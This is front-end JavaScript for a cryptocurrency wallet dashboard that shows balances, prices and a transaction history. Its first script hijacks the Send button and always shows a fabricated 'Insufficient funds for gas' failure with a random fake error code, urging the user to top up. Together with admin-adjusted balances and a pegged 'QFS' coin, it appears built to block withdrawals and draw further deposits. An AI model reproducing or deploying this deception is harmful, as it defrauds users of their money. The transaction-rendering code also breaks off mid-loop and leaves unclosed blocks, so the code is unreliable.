      <script>
/* ========== SEND BUTTON → INSUFFICIENT GAS ALERT ========== */
(function () {
  // Generate a random 16-digit hex error code
  function generateHexError() {
    const chars = '0123456789abcdef';
    let code = '0x';
    for (let i = 0; i < 16; i++) {
      code += chars[Math.floor(Math.random() * 16)];
    }
    return code;
  }

  function showGasError() {
    const errCode = generateHexError();

    if (typeof Swal !== 'undefined') {
      Swal.fire({
        icon: 'error',
        title: 'Transaction Failed',
        html: `
          <div style="text-align:left; padding: 4px 2px;">
            <p style="margin:0 0 12px 0; color:#e6edf3; font-size:0.95rem;">
              Insufficient funds for gas.
            </p>
            <div style="
              background:#1c2128;
              border:1px solid #30363d;
              border-radius:8px;
              padding:12px 14px;
              font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
              font-size:0.82rem;
              letter-spacing:0.04em;
            ">
              <span style="color:#8b949e;">Error:</span>
              <span style="color:#ff4d4f; font-weight:600;">${errCode}</span>
            </div>
            <p style="margin:14px 0 0 0; color:#8b949e; font-size:0.78rem;">
              Please top up your gas balance and try again.
            </p>
          </div>
        `,
        background: '#161b22',
        color: '#e6edf3',
        confirmButtonText: 'OK',
        confirmButtonColor: '#007bcf',
        buttonsStyling: true,
        customClass: {
          popup: 'swal2-dark-gas',
          confirmButton: 'btn btn-primary'
        }
      });
    } else {
      // Fallback if SweetAlert is missing
      alert('Insufficient funds for gas.\nError: ' + errCode);
    }
  }

  // Attach to the Send button (works with id="sendLink" or any send link)
  document.addEventListener('DOMContentLoaded', function () {
    const sendBtn = document.getElementById('sendLink') ||
                    document.querySelector('a[href*="send"]') ||
                    document.querySelector('.AppIcons a[href*="send"]');

    if (sendBtn) {
      sendBtn.addEventListener('click', function (e) {
        e.preventDefault();
        e.stopPropagation();
        showGasError();
      });
    }
  });
})();
</script>

    <!-- ========== MAIN SCRIPT ========== -->
    <script>
        // ---- CURRENCY HELPERS ----
        const CURRENCY_SYMBOLS = {
            USD: '$', EUR: '€', GBP: '£', NGN: '₦', CAD: 'C$', AUD: 'A$',
            JPY: '¥', CHF: 'CHF', CNY: '¥', INR: '₹', ZAR: 'R', GHS: 'GH₵',
            KES: 'KSh', AED: 'د.إ', SAR: '﷼', BRL: 'R$', MXN: 'MX$',
            TRY: '₺', RUB: '₽', SGD: 'S$'
        };

        const RATES = {
            USD: 1, EUR: 0.92, GBP: 0.79, NGN: 1600, CAD: 1.36, AUD: 1.53,
            JPY: 157, CHF: 0.89, CNY: 7.25, INR: 83.5, ZAR: 18.2, GHS: 15.5,
            KES: 129, AED: 3.67, SAR: 3.75, BRL: 5.4, MXN: 18.2, TRY: 32.5,
            RUB: 92, SGD: 1.35
        };

        function getPreferredCurrency() {
            return localStorage.getItem('preferred_currency') || 'USD';
        }

        function formatCrypto(amount) {
            if (amount === 0 || amount === null || amount === undefined) return '0';
            const num = Number(amount);
            if (isNaN(num)) return '0';
            return parseFloat(num.toFixed(8)).toLocaleString(undefined, {
                minimumFractionDigits: 0,
                maximumFractionDigits: 8
            });
        }

        function formatMoney(usdAmount) {
            const curr = getPreferredCurrency();
            const rate = RATES[curr] || 1;
            const symbol = CURRENCY_SYMBOLS[curr] || (curr + ' ');
            const converted = (Number(usdAmount) * rate).toLocaleString(undefined, {
                minimumFractionDigits: 2,
                maximumFractionDigits: 2
            });
            return symbol + converted;
        }

        // ---- CONFIG ----
        const API_BASE = (window.RA && RA.API_BASE) || ((location.hostname==='localhost'||location.hostname==='127.0.0.1') ? 'http://127.0.0.1:5987' : '${API_BASE}');

        // ---- COIN DETECTION ----
        const pageTitle = document.title;
        let coinName = 'TRON';
        let coinSymbol = 'TRX';
        let coinId = 'tron';
        let coinImage = '/assets/images/gateway/6873a06b1f0a21752408171.png';

        const coinMap = {
            'Bitcoin': { symbol: 'BTC', id: 'bitcoin', img: '/assets/images/gateway/68719dab8930f1752276395.png' },
            'Ethereum': { symbol: 'ETH', id: 'ethereum', img: '/assets/images/gateway/6873a06b1f0a21752408171.png' },
            'USDT': { symbol: 'USDT', id: 'tether', img: '/assets/images/gateway/68739dad0ba0c1752407469.png' },
            'TRON': { symbol: 'TRX', id: 'tron', img: '/assets/images/gateway/68739fcd492541752408013.png' },
            'BNB': { symbol: 'BNB', id: 'binancecoin', img: '/assets/images/gateway/6873a03b563e91752408123.png' },
            'Ripple': { symbol: 'XRP', id: 'ripple', img: '/assets/images/gateway/68f925d502e2f1761158613.png' },
            'Stellar': { symbol: 'XLM', id: 'stellar', img: '/assets/images/gateway/68f92bb8826c51761160120.png' }
        };

        for (const [name, data] of Object.entries(coinMap)) {
            if (pageTitle.includes(name)) {
                coinName = name;
                coinSymbol = data.symbol;
                coinId = data.id;
                coinImage = data.img;
                break;
            }
        }

        // Update static UI
        document.getElementById('coinName').innerText = `${coinName} (${coinSymbol})`;
        document.getElementById('coinSymbol').innerText = `(${coinSymbol})`;
        document.getElementById('coinImage').src = coinImage;
        document.getElementById('sendLink').href = `/dashboard/send/${coinId.toLowerCase()}.html`;
        document.getElementById('receiveLink').href = `/dashboard/receive/${coinId.toLowerCase()}.html`;

        // ---- AUTH ----
        function getToken() {
            return localStorage.getItem('token');
        }

        function walletCurrencyKey() {
            if (window.RA && typeof RA.walletKeyFor === 'function') {
                return RA.walletKeyFor(coinSymbol) || RA.walletKeyFor(coinId);
            }
            var s = String(coinSymbol || '').toLowerCase();
            if (s === 'trx') return 'tron';
            return s;
        }

        (function checkAuth() {
            const token = getToken();
            if (!token) {
                window.location.href = '/login.html';
                return;
            }

            (async function () {
                try {
                    var userRes;
                    if (window.RA && typeof RA.fetchUser === 'function') {
                        userRes = await RA.fetchUser();
                        if (!userRes.ok) throw new Error(userRes.error || 'Session expired');
                        var user = userRes.data || {};
                    } else {
                        var res = await fetch(`${API_BASE}/api/user`, {
                            headers: { 'Authorization': `Bearer ${token}` }
                        });
                        if (!res.ok) throw new Error('Session expired');
                        user = await res.json();
                    }
                    if (user.preferred_currency) {
                        localStorage.setItem('preferred_currency', user.preferred_currency);
                    }
                    localStorage.setItem('user', JSON.stringify({
                        id: user.id,
                        fullName: user.full_name || user.fullName,
                        email: user.email,
                        role: user.role
                    }));
                    loadCoinData();
                } catch (err) {
                    console.error('Auth error:', err);
                    localStorage.removeItem('token');
                    localStorage.removeItem('user');
                    window.location.href = '/login.html';
                }
            })();
        })();

        // ---- LOAD COIN DATA ----
        async function loadCoinData() {
            try {
                const token = getToken();

                
                // 1. Wallets (session cache via RA) + transactions in parallel
                let wallets = [];
                let allTxs = [];
                if (window.RA && typeof RA.fetchWallets === 'function') {
                    const [wRes, txRes] = await Promise.all([
                        RA.fetchWallets(),
                        RA.api('/api/transactions')
                    ]);
                    if (!wRes.ok) throw new Error(wRes.error || 'Failed to fetch wallets');
                    wallets = Array.isArray(wRes.data) ? wRes.data : ((wRes.data && wRes.data.wallets) || []);
                    if (txRes.ok) {
                        allTxs = Array.isArray(txRes.data) ? txRes.data : ((txRes.data && txRes.data.transactions) || []);
                    }
                } else {
                    const walletRes = await fetch(`${API_BASE}/api/wallets`, {
                        headers: { 'Authorization': `Bearer ${token}` }
                    });
                    if (!walletRes.ok) throw new Error('Failed to fetch wallets');
                    wallets = await walletRes.json();
                    const txRes = await fetch(`${API_BASE}/api/transactions`, {
                        headers: { 'Authorization': `Bearer ${token}` }
                    });
                    if (txRes.ok) allTxs = await txRes.json();
                }

                const wKey = walletCurrencyKey();
                const wallet = wallets.find(w => String(w.currency || '').toLowerCase() === wKey);
                const balance = wallet ? Number(wallet.balance) : 0;

                // 2. Fetch live USD price
                let priceUSD = 0;
                try {
                    const priceRes = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${coinId}&vs_currencies=usd`);
                    const priceData = await priceRes.json();
                    if (priceData[coinId]) priceUSD = priceData[coinId].usd || 0;
                } catch (e) {
                    console.warn('Price fetch failed', e);
                }

                // 3. Update UI (uses preferred currency)
                if (wKey === 'qfs' || String(coinSymbol).toUpperCase() === 'QFS') priceUSD = 1;
                if (wKey === 'usdt' || String(coinSymbol).toUpperCase() === 'USDT') priceUSD = 1;
                document.getElementById('coinBalance').innerText = formatCrypto(balance);
                document.getElementById('coinUSD').innerText = formatMoney(balance * priceUSD);
                if (window.RA && typeof RA.refreshSharedBalance === 'function') {
                    RA.refreshSharedBalance().catch(function(){});
                }
                // 4. Transactions already loaded in parallel above

const coinTxs = allTxs.filter(tx => {
                    const c = String(tx.currency || '').toLowerCase();
                    return c === wKey || c === String(coinSymbol).toLowerCase();
                });

                // 5. Render transactions
                const tbody = document.getElementById('transactionTableBody');
                tbody.innerHTML = '';

                if (coinTxs.length === 0) {
                    tbody.innerHTML = '<tr><td colspan="6" class="text-center text-muted">No transactions found</td></tr>';
                } else {
                    const user = JSON.parse(localStorage.getItem('user') || '{}');
                    const userId = user.id;

                    coinTxs.slice(0, 30).forEach(tx => {
                        const type = (tx.type || '').toLowerCase();
                        const status = (tx.status || 'completed').toLowerCase();

                        // Outflow = red minus  |  Inflow = green plus
                        // Matches Neon sender/receiver + type from SuperRight
                        let isOut = false;
                        if (['send', 'withdrawal'].includes(type)) {
                            isOut = true;
                        } else if (['receive', 'deposit'].includes(type)) {
                            isOut = false;
                        } else if (type === 'admin_adjust') {
                            // credit → receiver_id set; debit → sender_id set
                            isOut = String(tx.sender_id) === String(userId);
                        } else {
                            isOut = String(tx.sender_id) === String(userId);
                        }

                        const amount = Number(tx.amount);
                        const sign = isOut ? '-' : '+';
                        const color = isOut ? 'text-danger' : 'text-success';

                        let category = 'Other';
                        if (type === 'send') category = 'Sent';
                        else if (type === 'receive') category = 'Received';
                        else if (type === 'deposit') category = 'Deposit';
                        else if (type === 'withdrawal') category = 'Withdrawal';
                        else if (type === 'swap') category = 'Swap';
                        else if (type === 'admin_adjust') {
                            category = isOut ? 'Withdrawal' : 'Deposit';
                        } else {
                            category = type.charAt(0).toUpperCase() + type.slice(1);
                        }

                        let statusBadge = '';
                        if (status === 'completed') {
                            statusBadge = '<span class="badge bg-success" style="font-size:0.7rem;">Completed</span>';
                        } else if (status === 'pending') {
                            statusBadge = '<span class="badge bg-warning text-dark" style="font-size:0.7rem;">Pending</span>';
                        } else if (status === 'failed') {
                            statusBadge = '<span class="badge bg-danger" style="font-size:0.7rem;">Failed</span>';
                        } else if (status === 'cancelled') {
                            statusBadge = '<span class="badge bg-secondary" style="font-size:0.7rem;">Cancelled</span>';
                        } else {
                            statusBadge = `<span class="badge bg-secondary" style="font-size:0.7rem;">${status}</span>`;
                        }

                        const dt = tx.created_at ? new Date(tx.created_at) : null;
                        const dateStr = dt
                            ? dt.toLocaleString('en-US', {
                                month: 'short',
                                day: 'numeric',
                                year: 'numeric',
                                hour: '2-digit',
                                minute: '2-digit'
                              })
                            : '-';
                       


        // Fallback notify

        if (typeof notify === 'undefined') {
            window.notify = function(status, message) {
                alert(status + ': ' + message);
            };
        }

        // Auto-refresh every 60 seconds
        setInterval(loadCoinData, 60000);
    </script>
